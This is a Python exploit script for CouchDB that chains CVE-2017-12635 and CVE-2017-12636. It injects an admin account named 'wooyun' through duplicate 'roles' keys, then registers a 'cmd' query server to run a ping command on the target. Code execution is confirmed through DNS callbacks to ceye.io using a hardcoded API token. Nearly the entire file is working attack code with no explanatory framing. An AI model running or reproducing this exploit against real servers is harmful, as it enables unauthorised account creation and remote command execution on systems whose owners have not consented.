#!/usr/bin/python
# coding=utf-8


import json
import time
import random
import requests
from string import letters
from requests.auth import HTTPBasicAuth


ceye_domain = 'x.ceye.io'
ceye_api = '2ac0ac1cdda59cb5ea6e034d5f15f178'

command='"ping 7w13ox.ceye.io"'


def ceye_dnslog(api_url,banner):
    req=requests.get(api_url)
    try:
        name = req.json()['data'][0]['name']
        if banner in name:
            return True
    except Exception:
        return False


def get_version(url):
    try:
        response = requests.get(url)
        db_version = json.loads(response.text)
        return int(db_version['version'][0:1])
    except:
        return -1


def cve_2017_12635(url):
    url = "http://" + url if '://' not in url else url
    urlpath = r'/_users/org.couchdb.user:wooyun'
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Content-Type': 'application/json',
        }

    data = b"""
        {
          "type": "user",
          "name": "wooyun",
          "roles": ["_admin"],
          "roles":[],
          "password": "wooyun"
        }
        """
    try:
        req=requests.put(url=url+urlpath, headers=headers, data=data)
        if req.status_code in [201,409]:
            return url.rstrip('/') + '/_utils/' + ' ' * 5 + 'wooyun : wooyun'
    except:
        return False
    return False



def cve_2017_12636(url):
    url = "http://" + url if '://' not in url else url.rstrip('/')
    version=get_version(url)
    session = requests.session()
    session.headers = {'Content-Type': 'application/json'}
    session.auth = HTTPBasicAuth('wooyun', 'wooyun')
    banner=''.join([random.choice(letters) for i in range(6)])
    command = '"ping {}.{}"'.format(banner,ceye_domain)
    api_url = 'http://api.ceye.io/v1/records?token={}&type=dns&filter={}'.format(ceye_api, banner)
    if version == 1:
        try:
            session.put(url=url + ('/_config/query_servers/cmd'), data=command,timeout=10)
            session.put(url=url + '/wooyun',timeout=10)
            session.put(url=url + '/wooyun/test', data='{"_id": "wooyuntest"}',timeout=10)
            session.post(url=url + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}',timeout=10)
        except:
            pass
        time.sleep(2)
        if ceye_dnslog(api_url, banner):
            return url+ ' ' * 10 + 'rce'
        return False
    elif version == 2:
        try:
            host = session.get(url + '/_membership',timeout=10).json()['all_nodes'][0]
            session.put(url + '/_node/{}/_config/query_servers/cmd'.format(host), data=command,timeout=10)
            session.put(url + '/wooyun',timeout=10)
            session.put(url + '/wooyun/test', data='{"_id": "wooyuntest"}',timeout=10)
            session.put(url + '/wooyun/_design/test',timeout=10,
                        data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')
        except Exception as e:
            pass
        time.sleep(2)
        if ceye_dnslog(api_url, banner):
            return url+ ' ' * 10 + 'rce'
        return False



def poc(url):
    info = {}
    CVE_2017_12636=None
    CVE_2017_12635 = cve_2017_12635(url)
    if CVE_2017_12635:
        CVE_2017_12636 = cve_2017_12636(url)
    if CVE_2017_12635:
        info.update({"CVE_2017_12635": CVE_2017_12635})
    if CVE_2017_12636:
        info.update({"CVE_2017_12636": CVE_2017_12636})
    if len(info) > 0:
        return json.dumps(info, indent=2, ensure_ascii=False)
    else:
        return False



if __name__ == '__main__':
    print poc('http://127.0.0.1:5984')